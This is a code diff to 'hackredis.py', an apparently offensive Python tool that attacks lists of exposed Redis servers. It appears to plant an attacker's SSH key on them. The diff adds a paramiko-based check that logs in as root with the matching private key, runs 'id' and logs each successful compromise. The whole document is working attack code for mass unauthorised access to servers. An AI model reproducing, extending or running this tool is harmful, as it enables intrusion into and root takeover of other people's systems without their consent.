@@ -10,20 +10,26 @@ import argparse
 import textwrap
 import sys
 import pexpect
+try:
+   	import paramiko
+except ImportError:
+    print('Missing Paramiko Dependency.')
+    sys.exit(0)
 def getargs():
 	parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\
 	For Example:
 	-----------------------------------------------------------------------------
-	python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22'''))
+	python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22 -pk /tmp/key'''))
 	parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target')
 	parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port')
 	parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate')
 	parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port')
-	if(len(sys.argv[1:]) / 2 != 4):
+	parser.add_argument('-pk', dest='private_key', type=str, help='the ssh private key')
+	if(len(sys.argv[1:]) / 2 != 5):
 		sys.argv.append('-h')
 	return parser.parse_args()
 
-def hackredis(host,port):
+def hackredis(host,port,key):
 	ck = 0
 	try:
 		print "[*] Attacking ip:%s"%host
@@ -39,16 +45,20 @@ def hackredis(host,port):
 		write(host,2)
 		ck =0
 	if ck == 1:
-		check(host)
+		check(host,key)
 	else:
 		pass
 
-def check(host):
+def check(host,key):
 	print '\033[1;33;40m[*]\033[0m Check connecting... '
 	try:
-		ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port))
-		i = ssh.expect('[#\$]',timeout=2)
-		if i == 0:
+		key=paramiko.RSAKey.from_private_key_file(key)
+		ssh=paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		ssh.connect(hostname=host, username='root', pkey=key)
+		stdin, stdout, stderr=ssh.exec_command('id')
+		out = stdout.read()
+		if "root" in out:
 			print "\033[1;34;40m[+]\033[0m Success !"
 			write(host,1)
 		else:
@@ -80,6 +90,7 @@ def main():
 		sys.exit(1) 
 	port = paramsargs.port
 	ssh_port = paramsargs.ssh_port
+	key = paramsargs.private_key
 	try:
 		foo = '\n\n\n'+open(paramsargs.id_rsafile,"r").readline()+'\n\n\n'
 	except(IOError):
@@ -87,7 +98,7 @@ def main():
 		sys.exit(1)     
 	ips = [p.replace('\n','') for p in hosts]
 	for ip in ips:
-		hackredis(ip.strip(),port)
+		hackredis(ip.strip(),port,key)
 
 
 if __name__ == "__main__":
